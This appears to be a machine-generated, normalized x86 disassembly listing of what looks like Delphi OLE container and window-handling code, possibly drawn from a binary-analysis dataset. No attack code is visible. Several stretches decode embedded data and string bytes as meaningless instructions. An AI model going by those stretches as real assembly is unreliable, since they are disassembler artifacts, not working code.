call sub_4033e8
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_4033e8
jmp r-xdata
cmp [ ecx + 0x8 ] 0x2
jl r-xdata
cmp [ ecx + 0x8 ] 0x0
jle r-xdata
cmp [ ecx + 0x8 ] 0x4
jl r-xdata
lea eax [ ebx + 0x10 ]
call sub_40fbd8
mov [ ebp - 0xe ] ax
mov eax ebx
call sub_40fbd8
mov edi eax
sub esi 0xfffffda4
je r-xdata
mov eax ebx
call sub_40fbd8
mov [ ebp - 0xf ] al
lea edx [ ebp - 0xf ]
mov eax [ ebp - 0x4 ]
mov si 0xffba
call sub_4033e8
test [ ebx + 0x1 ] 0x40
je r-xdata
lea eax [ ebx + 0x30 ]
call sub_40fbd8
mov edi eax
and edi 0x7
lea eax [ ebx + 0x20 ]
call sub_40fbd8
and eax 0x7
mov [ ebp - 0xc ] eax
mov al [ edi + rw-data ]
mov [ ebp - 0x6 ] al
mov al [ edi + rw-data ]
mov edx [ ebp - 0xc ]
or al [ edx + rw-data ]
mov [ ebp - 0x5 ] al
lea eax [ ebx + 0x10 ]
call sub_40fbd8
mov edi eax
mov eax ebx
call sub_40fbd8
mov [ ebp - 0xc ] eax
sub esi 0xfffffda1
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbb
call sub_4033e8
sub esi 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
mov dl [ ebp - 0xf ]
mov [ eax ] dl
jmp r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd3
call sub_4033e8
dec esi
je r-xdata
mov eax [ ebx + 0x18 ]
mov dx [ ebp - 0xe ]
mov [ eax ] dx
jmp r-xdata
test [ ebx + 0x11 ] 0x40
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbc
call sub_4033e8
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx edi
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd4
call sub_4033e8
jmp r-xdata
dec esi
jne r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd5
call sub_4033e8
jmp r-xdata
sub_47bf14
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0xbd00
jb r-xdata
mov eax [ esi ]
sub eax 0xb008
je r-xdata
cmp eax 0xbd08
ja r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x230 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_459d5c
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
jmp r-xdata
mov eax ebx
call sub_45c380
mov [ esp ] eax
mov eax [ esi ]
sub eax 0xbc00
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x8 ] eax
mov eax [ esi + 0x8 ]
mov [ esp + 0xc ] eax
call GetMessageTime
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] 0x115de1f1
mov [ esp + 0x18 ] 0x115de1f1
push esp
mov eax [ ebx + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
push 0xfffffd41
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
push 0xfffffd40
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
push 0xfffffd43
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
add esp 0x1c
pop esi
pop ebx
retn
sub_47bffc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
setne [ ebp - 0x5 ]
xor eax eax
push ebp
push j_sub_4037f8
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_47c0bb
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_47c098
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalSize
mov ecx eax
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c09f
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
mov eax [ ebp - 0x4 ]
call sub_47ab24
sub_47c0c2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47c0df
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd8 ]
test al al
jne r-xdata
call sub_403a34
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_4039e0
sub_47c104
push esi
mov esi eax
test [ esi + 0x23d ] 0x4
jne r-xdata
mov eax esi
call sub_45a79c
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_47c124
push ebx
push esi
push edi
add esp 0xffffffb0
mov edi edx
mov ebx eax
test [ ebx + 0x23d ] 0x4
je r-xdata
mov edx edi
mov eax ebx
call sub_45a4d8
mov esi [ edi + 0x4 ]
test esi esi
jne r-xdata
lea edx [ esp + 0x40 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x40 ]
push eax
push esi
push 0x1
mov eax [ ebx + 0x218 ]
push eax
call OleDraw
cmp [ edi + 0x4 ] 0x0
jne r-xdata
push esp
mov eax ebx
call sub_45c380
push eax
call BeginPaint
mov esi eax
add esp 0x50
pop edi
pop esi
pop ebx
retn
push esp
mov eax ebx
call sub_45c380
push eax
call EndPaint
jmp r-xdata
sub_47c194
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
call sub_46cc58
mov edi eax
xor ebx ebx
mov eax edi
mov edx [ r-xdata ]
call sub_403378
test al al
je r-xdata
test ebx ebx
je r-xdata
mov ebx edi
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp + 0x4 ]
push eax
mov eax [ esi + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push esi
call sub_47ca34
sub_47c1f0
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45b87c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c684
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_47c269
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x70 ]
mov edx 0xfffffe0b
mov eax [ ebp - 0x4 ]
call sub_47b7d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x0
retn
sub_47c274
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_45b834
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c684
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push sub_47c2f3
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb ecx ecx
mov edx 0xfffffdfe
mov eax [ ebp - 0x4 ]
call sub_47b8f0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x0
retn
sub_47c300
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47c3f5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_45b8a4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x6
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47c3fc
lea eax [ ebp - 0x14 ]
call sub_40f234
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_45c684
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push j_sub_403980#8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ eax + 0x18 ]
mov edx 0xfffffdff
mov eax [ ebp - 0x4 ]
call sub_47b824
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x0
retn
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_47a154
lea ecx [ ebp - 0x14 ]
mov edx 0xfffffe00
mov eax [ ebp - 0x4 ]
call sub_47bc78
sub_47c400
push ebx
push esi
push edi
add esp 0xffffffd0
mov edi edx
mov ebx eax
mov eax ebx
mov si 0xffb8
call sub_4033e8
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45b7c4
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
lea eax [ esp + 0x14 ]
xor ecx ecx
mov edx 0x1c
call sub_402bf8
mov eax ebx
call sub_45c380
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x100
mov eax [ edi + 0x4 ]
mov [ esp + 0x1c ] eax
mov eax [ edi + 0x8 ]
mov [ esp + 0x20 ] eax
push esp
lea eax [ esp + 0x18 ]
push eax
movzx eax [ esp + 0x14 ]
push eax
mov eax [ esp + 0x14 ]
push eax
call IsAccelerator
test eax eax
je r-xdata
lea eax [ esp + 0x14 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
add esp 0x30
pop edi
pop esi
pop ebx
retn
sub_47c4b8
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_46cc58
test eax eax
je r-xdata
mov edx esp
mov eax ebx
call sub_4553ec
push esp
mov eax ebx
call sub_45c17c
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
cmp ebx [ eax + 0x27c ]
je r-xdata
push eax
push 0x0
push 0xfffffffc
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
sub eax 0xfffffd9c
add esp 0x10
pop ebx
retn
sub_47c508
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_46cc58
mov esi eax
test esi esi
je r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
cmp ebx [ esi + 0x27c ]
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
pop esi
pop ebx
retn
cmp ebx [ esi + 0x220 ]
jne r-xdata
push 0x0
push ebx
call sub_47c8fc
sub_47c550
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4032a0
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_47c604
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call MulDiv
mov esi eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call MulDiv
mov edi eax
test [ ebx + 0x23d ] 0x4
je r-xdata
push esi
push edi
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
cmp esi 0x20
jle r-xdata
cmp edi 0x20
jle r-xdata
mov esi 0x20
mov edi 0x20
sub_47c6d8
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
test [ ebp + 0x14 ] 0x4
je r-xdata
fld [ esi ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_4029f0
mov [ ebx ] eax
fld [ esi + 0x4 ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_4029f0
mov [ ebx + 0x4 ] eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx ]
push eax
call MulDiv
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi ]
fwait
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call MulDiv
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi + 0x4 ]
fwait
jmp r-xdata
xor eax eax
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_47c7a8
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
mov eax ebx
call sub_45c17c
mov [ esi ] eax
cmp [ esi ] 0x0
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edi 0x80004005
sub_47c7e0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x22c ]
call sub_4058a0
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
lea eax [ ebx + 0x230 ]
call sub_4058a0
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_47c826
add [ eax ] al
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop ss
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dl 0x1
call sub_47bc28
xor eax eax
pop ebp
retn 0x4
sub_47c85c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov edx ebx
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_4058b8
mov eax [ ebp + 0x10 ]
call sub_4058a0
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_4553ec
mov eax [ ebp + 0x14 ]
push esi
lea esi [ ebp - 0x10 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0x7fff
push 0x7fff
push 0x0
push 0x0
mov eax [ ebp + 0x18 ]
push eax
call SetRect
xor eax eax
mov [ esi + 0x4 ] eax
mov eax ebx
call sub_45c194
mov [ esi + 0x8 ] eax
xor eax eax
mov [ esi + 0xc ] eax
xor eax eax
mov [ esi + 0x10 ] eax
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub edx 0xfffffda8
sub_47c8fc
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x0
push ebx
call sub_47ca34
xor edx edx
mov eax ebx
call sub_47bc28
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_47c9f4
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ ebp + 0x8 ]
call sub_47afc8
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0xc
push 0x2
mov edx [ ebp + 0x10 ]
push edx
push 0x5
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0x2
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
call sub_469d8c
sub_47ca34
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
call sub_47afc8
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn 0x10
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_469ddc
push 0x0
push 0x0
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call OleSetMenuDescriptor
sub_47cc8c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_47ce90
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_4037f8#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
sub eax 0xfffffdfe
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push j_sub_403980#7
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdfe
mov eax [ ebp + 0x8 ]
call sub_47b018
cmp ax 0x1
sbb edx edx
inc edx
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24b ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
dec eax
je r-xdata
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ce97
lea eax [ ebp - 0x10 ]
call sub_40f234
retn
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_47ce51
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffdff
mov eax [ ebp + 0x8 ]
call sub_47afb4
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x68 ]
call sub_4247a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
sub eax 0xb
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push j_sub_403980#6
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx 0xfffffe00
mov eax [ ebp + 0x8 ]
call sub_47b21c
lea eax [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x68 ]
call sub_47a1a0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x24a ] 0x0
retn
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_47cd2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0xfffffe0b
mov eax [ ebp + 0x8 ]
call sub_47afb4
mov edx eax
mov eax [ ebp + 0x8 ]
call sub_455bec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x249 ] 0x0
retn
sub_47cec8
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_403980#5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cf00
retn
mov eax rw-data
call sub_40f234
sub_47cf04
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_47cf4c
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cf53
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418444
mov eax rw-data
mov edx [ rw-data ]
call sub_40f548
sub_47cf5c
adc [ 0x72615654 ] ecx
imul esp [ ecx + 0x6e ] 0x72724174
popad
jns r-xdata
dec edi
insb
push ebx
jb r-xdata
add [ eax ] al
add [ eax ] dl
adc [ eax ] eax
or al 0x0
add [ eax ] al
adc [ ecx ] dl
inc eax
add [ ecx ] cl
jb r-xdata
jb r-xdata
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
dec edx
rol [ edi ] 0x1
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
dec edx
rol [ edi ] 0x1
or al 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov eax eax
jb r-xdata
mov [ eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
inc eax
add [ edi + ecx * 8 + 0xc030047 ] cl
push esp
inc ebx
outsd
outsb
outsb
arpl [ gs : ebx + ecx * 2 + 0x69 ] si
outsb
add [ fs : eax ] eax
add [ eax ] al
add [ eax + eax ] al
add [ eax ] al
mov bh cl
inc edi
add [ esi ] cl
arpl [ ebx + 0x52 ] bp
jne r-xdata
add [ ebx ] al
or al 0x54
inc eax
add ah cl
add [ esp + 0x4 ] 0xfffffff4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47cf53
retn
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_418444
mov eax rw-data
mov edx [ rw-data ]
call sub_40f548
jge r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x654e724f
ja r-xdata
inc esp
and al 0x4
hlt
add [ eax ] al
add [ esp + 0x4 ] 0xfffffff4
jmp r-xdata
adc [ ebx + 0x6b ] esp
push edx
arpl [ ebx + 0x4e ] bp
ja r-xdata
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push j_sub_403980#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x1c ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051b4
add esp 0x4
xor eax eax
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_405000
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
jmp r-xdata
outsb
imul ebp [ esi + 0x67 ] 0x74736e49
popad
outsb
arpl [ ebp + 0x8 ] sp
arpl [ ebx + 0x52 ] bp
insd
outsd
je r-xdata
jmp sub_47d378
outsb
jae r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
add eax [ eax ]
add ah cl
int3
adc esp [ ebx + 0x6b ]
inc ecx
je r-xdata
inc esp
and al 0x4
hlt
jne r-xdata
popad
outsb
arpl [ ebp + 0x11 ] sp
arpl [ ebx + 0x52 ] bp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
inc edi
inc edi
inc [ ebx + 0x8 ]
mov eax [ ebx + 0x8 ]
pop ebx
pop ebp
retn 0x4
push eax
call sub_47d7d8
add [ ebx ] cl
rol [ edi ] 0x1
adc eax 0x1f0047d0
rol [ edi ] 0x1
add al [ eax ]
add [ eax ] al
add [ edx + eax ] al
add [ eax ] al
add [ eax ] al
popad
arpl [ eax + 0x54 ] bp
outsd
dec ecx
outsb
je r-xdata
mov eax [ ebp - 0x8 ]
cmp [ eax + 0xc ] 0x0
jle r-xdata
lea ecx [ ebp - 0x4 ]
mov edx [ ebp + 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x10 ]
sub eax ebx
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f548
inc ebx
dec edi
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov eax [ eax + ebx * 4 ]
add eax eax
mov edx [ ebp - 0x4 ]
lea eax [ edx + eax * 8 ]
mov edx esi
call sub_40f548
inc ebx
dec edi
jne r-xdata
jmp r-xdata
rol [ edi ] 0x1
jb r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
mov ebx [ ebp - 0xc ]
mov edi [ ebp - 0x10 ]
sub edi ebx
jl r-xdata
add eax edx
inc edi
popad
arpl [ ebp + 0x9 ] sp
dec edi
insb
push ebx
jb r-xdata
push 0x0
lea eax [ ebp - 0x4 ]
mov ecx 0x1
mov edx [ r-xdata ]
call sub_4051b4
add esp 0x4
xor ebx ebx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47d53d
inc edi
inc edi
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x10 ]
sub edx ebx
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f548
inc ebx
dec edi
jne r-xdata
mov eax esi
mov edx [ ebp - 0x8 ]
mov edx [ edx + 0x4 ]
mov edx [ edx + ebx * 4 ]
add edx edx
mov ecx [ ebp - 0x4 ]
lea edx [ ecx + edx * 8 ]
call sub_40f548
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
jne r-xdata
mov eax ebx
add eax eax
mov edx [ ebp - 0x8 ]
mov edx [ edx ]
lea esi [ edx + eax * 8 ]
mov ax [ esi ]
and ax 0x4000
cmp ax 0x4000
